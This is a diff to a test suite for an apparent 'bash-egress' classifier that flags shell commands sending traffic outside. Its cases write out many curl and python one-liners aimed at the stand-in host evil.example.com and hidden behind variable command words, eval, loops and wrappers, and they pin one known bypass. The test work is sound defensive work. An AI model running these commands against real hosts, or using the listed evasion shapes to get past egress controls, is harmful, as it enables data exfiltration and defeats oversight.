@@ -1672,6 +1672,17 @@ describe('bash-egress: loop variable via assignment, append, function bodies (e9
     expect(String(t.stdout)).toContain(H)
     expect(classify(c)).toMatchObject({ deny: true, reason: 'curl-unresolved-destination' })
   })
+  it('Viktor 43701 INFO 1: the unread rule takes a braced reference and a positional one, not only $NAME', () => {
+    for (const c of [
+      `fn() { curl -s \${V:-${H}}; }; V=\${W}; W=/p; fn`,
+      `fn() { curl -s \${V:-${H}}; }; V="\${W}"; W=/p; fn`,
+      `for V in "$1"; do curl -s \${V:-${H}}; done`,
+      `for V in "$*"; do curl -s \${V:-${H}}; done`,
+    ]) {
+      expect(bashTarget(c)).toContain(H)
+      expect(classify(c)).toMatchObject({ deny: true })
+    }
+  })
   it('Viktor 43683 INFO 3 (E29): sibling frames with function readings do not hide each other\'s values', () => {
     const c = `a=$(fn() { curl -s $U/p; U=127.0.0.1; }; U=localhost; fn; fn); b=$(fn() { curl -s $U/p; U=$V; }; U=localhost; V=${H}; fn; fn); echo "$a$b"`
     expect(bashTarget(c)).toContain(H)
@@ -1775,13 +1786,112 @@ describe('bash-egress: eval runs its joined arguments as a command line (40305fb
     expect(evalString(['eval', '--'], 0)).toBeNull()
     expect(evalString(['eval'], 1)).toBeNull()
   })
-  it('a variable command word is not resolved (as for curl itself): a known gap, pinned so a change is seen', () => {
-    expect(classify(`f=eval; $f curl -s https://${H}/x`)).toMatchObject({ deny: false })
-    expect(classify(`f=curl; $f https://${H}/x`)).toMatchObject({ deny: false })
+  it('a variable command word that holds eval or curl is read (card 772cd001; pinned as a gap on 40305fb7)', () => {
+    expect(classify(`f=eval; $f curl -s https://${H}/x`)).toMatchObject({ deny: true, reason: 'curl-external' })
+    expect(classify(`f=curl; $f https://${H}/x`)).toMatchObject({ deny: true, reason: 'curl-external' })
   })
   it('the vendor list holds inside eval', () => {
     const vendor = new Set(['api.elevenlabs.io'])
     expect(classify('eval curl -s https://api.elevenlabs.io/v1/x', 0, vendor).deny).toBe(false)
     expect(classify(`eval curl -s https://api.elevenlabs.io/v1/x https://${H}/x`, 0, vendor)).toMatchObject({ deny: true, hosts: [H] })
+  })
+})
+
+// Card 772cd001 (found next to 40305fb7): a command word that is a variable was judged as the lexer's word `$f`, so
+// `f=curl; $f <ext>`, `for f in curl; do $f <ext>; done` and `f=bash; $f -c 'curl <ext>'` passed. Each reading's own
+// expanded command word is judged now; one that stays unresolved denies when the command carries an external URL
+// literal. Checked against the real /bin/bash where bash can show it (curl is a function printing its argv, PATH points
+// nowhere: a path, a child shell or a wrapper runs no function, so those shapes are asserted on the gate alone).
+describe('bash-egress: a variable command word is expanded (772cd001)', () => {
+  const H = 'evil.example.com'
+  const bashTarget = (c: string) => {
+    const t = spawnSync('/bin/bash', ['-c', `curl() { printf '[%s]' "$@"; }; ${c}`], { env: { PATH: '/nonexistent' }, encoding: 'utf8' })
+    return String(t.stdout)
+  }
+  const external = [
+    `f=curl; $f -s https://${H}/x`,
+    `f=curl; "$f" -s https://${H}/x`,
+    `f=curl; \${f} -s https://${H}/x`,
+    `f="curl -s"; $f https://${H}/x`, // word splitting: the command is curl
+    `g=curl; f=$g; $f -s https://${H}/x`,
+    `for f in curl; do $f -s https://${H}/x; done`,
+    `for f in echo curl; do $f -s https://${H}/x; done`,
+    `f=eval; $f curl -s https://${H}/x`,
+    `f=curl; x=$($f -s https://${H}/x); echo "$x"`,
+  ]
+  const local = [
+    'f=curl; $f -s http://localhost:3420/api/kanban',
+    `f=echo; $f https://${H}/x`,
+    `for f in echo printf; do $f https://${H}/x; done`,
+    '$PY script.py',
+    '"$HOME/bin/tool" --flag',
+    `f=bash; $f -c "echo https://${H}/x"`,
+  ]
+  it.each(external)('denies what bash sends outside: %s', (c) => {
+    expect(bashTarget(c)).toContain(H)
+    expect(classify(c)).toMatchObject({ deny: true })
+  })
+  it.each(local)('passes what bash keeps local: %s', (c) => {
+    expect(bashTarget(c)).not.toMatch(/\[[^\]]*evil\.example\.com/)
+    expect(classify(c)).toMatchObject({ deny: false })
+  })
+  it('a path, a child shell, a wrapper or an interpreter in the variable is judged like the literal word', () => {
+    expect(classify(`f=/usr/bin/curl; $f -s https://${H}/x`)).toMatchObject({ deny: true, reason: 'curl-external' })
+    expect(classify(`f=bash; $f -c "curl -s https://${H}/x"`)).toMatchObject({ deny: true, reason: 'curl-external' })
+    expect(classify(`f=curl; env $f -s https://${H}/x`)).toMatchObject({ deny: true, reason: 'curl-external' })
+    expect(classify(`f=curl; timeout 5 $f -s https://${H}/x`)).toMatchObject({ deny: true, reason: 'curl-external' })
+    // the wrapper itself in the variable: the expanded reading's own command word index decides (Viktor 43715 INFO 1)
+    expect(classify(`f=env; $f curl -s https://${H}/x`)).toMatchObject({ deny: true, reason: 'curl-external' })
+    expect(classify(`f=nohup; $f curl -s https://${H}/x`)).toMatchObject({ deny: true, reason: 'curl-external' })
+    expect(classify(`f=python3; $f -c "import urllib.request; urllib.request.urlopen('https://${H}/x')"`)).toMatchObject({ deny: true, reason: 'one-liner-external' })
+    // the code flag comes from the variable too (word splitting: python3 -c <code>)
+    expect(classify(`f="python3 -c"; $f "import urllib.request; urllib.request.urlopen('https://${H}/x')"`)).toMatchObject({ deny: true, reason: 'one-liner-external' })
+  })
+  it('a link that is only data in a variable-named local curl passes', () => {
+    expect(classify(`f=curl; $f -s -X POST http://localhost:3420/api/x -d "see https://${H}/x"`)).toMatchObject({ deny: false })
+  })
+  it('an unresolved command word denies only with an external URL literal in the command', () => {
+    expect(classify(`$CURLBIN -s https://${H}/x`)).toMatchObject({ deny: true, reason: 'command-unresolved' })
+    expect(classify(`sh -c '"$@"' x curl -s https://${H}/x`)).toMatchObject({ deny: true, reason: 'command-unresolved' })
+    expect(classify('$CURLBIN -s http://localhost:3420/api/kanban')).toMatchObject({ deny: false })
+    expect(classify('$EDITOR notes.md')).toMatchObject({ deny: false })
+  })
+  it('the plain reading of a loop variable is not unresolved; a loop past the variant limit is', () => {
+    expect(classify(`for f in echo; do $f https://${H}/x; done`)).toMatchObject({ deny: false })
+    let c = 'for f in ' + Array.from({ length: 70 }, (_, k) => `t${k}`).join(' ') + '; do for g in a b; do $f $g; done; done; '
+    c += `echo https://${H}/x`
+    expect(classify(c)).toMatchObject({ deny: true, reason: 'command-unresolved' })
+  })
+  it('a 64-value loop over thousands of variable-command spans stays within the hook budget', () => {
+    const vals = Array.from({ length: 64 }, (_, k) => `127.0.0.${k + 1}`).join(' ')
+    let c = `f=curl; for u in ${vals}; do `
+    while (c.length < 60000) c += '$f -s $u/p; '
+    const t0 = Date.now()
+    expect(classify(c + 'done')).toMatchObject({ deny: false })
+    expect(Date.now() - t0).toBeLessThan(2000)
+  })
+  it('NAME+= before the command is an assignment prefix: the curl after it is the command', () => {
+    expect(bashTarget(`V+=x curl -s https://${H}/x`)).toContain(H)
+    expect(classify(`V+=x curl -s https://${H}/x`)).toMatchObject({ deny: true, reason: 'curl-external' })
+    expect(classify('V+=x curl -s http://localhost:3420/api/kanban')).toMatchObject({ deny: false })
+  })
+  it('an array element assignment before the command is a prefix too (Viktor 43715 LELET 1)', () => {
+    expect(bashTarget(`V[0]=x curl -s https://${H}/x`)).toContain(H)
+    expect(classify(`V[0]=x curl -s https://${H}/x`)).toMatchObject({ deny: true, reason: 'curl-external' })
+    expect(classify(`V[k]+=x curl -s https://${H}/x`)).toMatchObject({ deny: true, reason: 'curl-external' })
+    // any index (Viktor 43724 INFO 1): longer, a name, empty
+    for (const idx of ['10', 'key', '']) {
+      expect(classify(`V[${idx}]=x curl -s https://${H}/x`)).toMatchObject({ deny: true, reason: 'curl-external' })
+    }
+    // a nested bracket, a quoted index with a blank, an index the lexer splits at a blank (Viktor 43724 LELET 1)
+    expect(classify(`V[a[0]]=x curl -s https://${H}/x`)).toMatchObject({ deny: true, reason: 'curl-external' })
+    expect(classify(`V["a b"]=x curl -s https://${H}/x`)).toMatchObject({ deny: true, reason: 'curl-external' })
+    expect(classify(`V[0 ]=x curl -s https://${H}/x`)).toMatchObject({ deny: true, reason: 'curl-external' })
+    expect(classify(`V[ 0]=x curl -s https://${H}/x`)).toMatchObject({ deny: true, reason: 'curl-external' })
+    expect(classify('V[0]=x curl -s http://localhost:3420/api/kanban')).toMatchObject({ deny: false })
+    expect(classify('V[0 ]=x echo hello')).toMatchObject({ deny: false })
+  })
+  it('a substitution as the command word is not read (a stated gap, pinned so a change is seen)', () => {
+    expect(classify(`$(echo curl) -s https://${H}/x`)).toMatchObject({ deny: false })
   })
 })
